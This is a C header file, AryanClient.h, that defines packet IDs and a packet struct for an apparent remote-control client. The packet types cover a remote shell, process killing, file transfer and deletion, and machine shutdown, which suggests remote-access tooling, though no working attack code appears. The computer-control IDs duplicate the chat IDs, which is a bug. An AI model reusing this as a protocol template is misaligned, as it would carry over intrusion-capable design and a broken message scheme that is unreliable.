#ifndef __AryanClient_h
#define __AryanClient_h 

#define  PACKET_ADD_ID					1991
#define	 PACKET_USER_JOINED				1992
/////////////////////////////////////////////////
//Shell Packet headers
#define  PACKET_CMD_RECV			     2000
#define  PACKET_REMOTE_SHELL_START		 2001
/////////////////////////////////////////////////
//Task manager Packet headers
#define	 PACKET_TASK_MANAGER			 2002
#define	 PACKET_TASK_MANAGER_KILL		 2003
#define  PACKET_TASK_MANAGER_TASKS       2004
/////////////////////////////////////////////////
//File manager Packet headers
#define	 PACKET_FILE_MANAGER_DRIVE		 2010
#define	 PACKET_FILE_MANAGER_FOLDER		 2011
#define  PACKET_FILE_MANAGER_FILE		 2012
#define  PACKET_FILE_MANAGER_FILE_FOLDER 2013
#define	 PACKET_FILE_MANAGER_FILE_COPY   2014
#define  PACKET_FILE_MANAGER_NEW_FOLDER  2015
#define  PACKET_FILE_MANAGER_DELETE_FILE 2016
#define  PACKET_FILE_MANAGER_FILE_CUT    2017
#define  PACKET_FILE_MANAGER_FILE_RENAME 2018
#define  PACKET_FILE_MANAGER_FILE_RECV_S 2019
#define  PACKET_FILE_MANAGER_FILE_RECV	 2020
#define  PACKET_FILE_MANAGER_FILE_C      2021
/////////////////////////////////////////////////
//Computer Packet headers
#define  PACKET_COMPUTER_LOGOFF			 2030
#define  PACKET_COMPUTER_SHUTDOWN		 2031
#define  PACKET_COMPUTER_RESTART		 2032
/////////////////////////////////////////////////
//Chat Packet headers
#define  PACKET_CHAT_START		         2030
#define	 PACKET_CHAT_MSG				 2031
#define	 PACKET_CHAT_CLOSE				 2032
//////////////////////////////////////////////////
//Packet Structer
typedef struct
{
	DWORD	PacketType;
	char    Data		[3072];
	char	PID			[100];
	char    Threads		[100];
	char	ParentPID	[100];
	char	PRIORITY	[100];
	char	Buf			[100];
	char	Buf2		[512];
	char	Buf3		[100];
	char    IDS			[10];
	int		ID;
	int		ID2;
	int		ID3;
	float   FileID;
} PACKETHEAD;
#endif